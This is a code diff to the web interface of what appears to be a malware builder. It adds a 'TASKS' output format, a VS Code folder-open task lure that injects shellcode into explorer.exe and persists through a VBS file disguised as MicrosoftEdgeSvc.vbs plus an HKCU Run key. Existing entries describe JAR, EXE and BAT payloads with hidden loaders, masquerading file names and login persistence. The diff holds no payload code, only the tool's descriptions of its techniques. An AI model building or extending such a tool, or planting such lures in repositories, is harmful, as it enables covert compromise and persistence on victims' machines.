@@ -98,7 +98,7 @@
 
     .format-tabs {
       display: grid;
-      grid-template-columns: repeat(3, 1fr);
+      grid-template-columns: repeat(4, 1fr);
       gap: 8px;
     }
     .fmt-btn {
@@ -259,6 +259,11 @@
       <div class="fmt-name">BAT</div>
       <div class="fmt-desc">VBS+PS reflective loader</div>
     </div>
+    <div class="fmt-btn" data-fmt="tasks">
+      <div class="fmt-icon">🗂️</div>
+      <div class="fmt-name">TASKS</div>
+      <div class="fmt-desc">VS Code lure + inject</div>
+    </div>
   </div>
 
   <!-- Dual-hook toggle -->
@@ -309,6 +314,7 @@
     jar: '<b>Hook 1:</b> <code>static{}</code> initializer (fires on class load) · <b>Hook 2:</b> <code>main()</code> entry point · <b>Persist:</b> copies to <code>%APPDATA%\\JavaUpdate.exe</code> + HKCU Run key',
     exe: '<b>Hook 1:</b> Primary process spawn (hidden window) · <b>Hook 2:</b> Registers HKCU Run key via <code>reg add</code> so it re-runs on every login',
     bat: '<b>Hook 1:</b> VBS spawns PS hidden → C# PE loader maps payload in memory (no EXE on disk) · <b>Hook 2:</b> Copies VBS to <code>%APPDATA%\\MicrosoftEdgeSvc.vbs</code> + HKCU Run key → <code>wscript /b</code> re-runs on every login',
+    tasks: '<b>Hook 1:</b> VS Code folder-open task → shellcode injected into <code>explorer.exe</code> (LOTL) · <b>Hook 2:</b> Drops VBS sidecar to <code>%APPDATA%\\MicrosoftEdgeSvc.vbs</code> + HKCU Run key → re-injects on every login',
   };
 
   // Drag & drop
